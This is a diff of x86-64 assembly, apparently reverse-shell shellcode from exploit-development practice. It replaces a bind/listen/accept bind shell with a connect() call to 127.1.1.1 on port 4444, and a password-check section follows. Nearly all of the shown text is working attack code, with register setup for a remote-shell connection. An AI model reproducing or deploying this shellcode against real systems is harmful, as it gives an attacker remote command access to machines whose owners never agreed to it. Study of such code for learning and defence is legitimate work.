@@ -34,51 +34,30 @@ _start:
 
 
 	
-	; define __NR_bind 49
+	; define __NR_connect 42 (0x2a)
 	; struct sockaddr_in {
 	;      sa_family_t    sin_family address family: AF_INET
         ;      in_port_t      sin_port   port in network byte order 
         ;      struct in_addr sin_addr   internet address
 
 
-	xor rax, rax			; initialize rax
-	mov al, 0x31			; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
-	xor rdx, rdx			; initialize rdx
-	mov dl, 0x10			; socklen_t addrlen (16)
-	xor rsi, rsi			; initialize rsi
-	mov [rsp - 0x4], esi		; IP Addr 0.0.0.0
-	mov word [rsp - 0x6], 0x5c11	; Port 4444
-	mov [rsp - 0xa], esi		; null byte
-	mov byte [rsp - 0x8], 0x2	; AF_INET
-	sub rsp, 0x8			; adjust stack
-	mov rsi, rsp			; pointer to NULL byte
-	syscall				; syscall
+	xor rax, rax				; initialize rax
+	mov al, 0x2a				; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+	xor rdx, rdx				; initialize rdx
+	mov dl, 0x10				; socklen_t addrlen (16)
+	xor rsi, rsi				; initialize rsi
+	push rsi				; NULL byte
+	mov dword [rsp - 0x4], 0x101017f	; IP Addr 127.1.1.1
+	mov word [rsp -0x6], 0x5c11		; Port 4444
+	mov dword [rsp -0xa], esi		; null byte
+	mov byte [rsp - 0x8],  0x2		; AF_INET
+	sub rsp, 0x8				; readjust stack
+	mov rsi, rsp				; const struct sockaddr *addr
+	syscall					; syscall
 
-	
-	; define __NR_listen 50
-
-	xor rax, rax
-	mov al, 0x32		; int listen(int sockfd, int backlog)
-	xor rsi, rsi		; initialize rsi
-	inc rsi			; int backlog
-	syscall			; syscall
-	
-
-	; define __NR_accept 43
-
-	xor rax, rax
-	push rax
-	mov al, 0x2b		; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
-	mov rsi, rsp		; struct sockaddr *addr
-	push byte 0x10		; 
-	mov rdx, rsp		; socklen_t *addrlen
-	syscall			; syscall
-	xor r15, r15		; initialize r15
-	mov r15, rdi		; save sockfd just in case
-	mov rdi, rax		; acceptfd for later
 	xor r9, r9
-	mov r9, rdi		; to be sure we keep our acceptfd
-
+	mov r9, rdi
+	
 
 password:
 
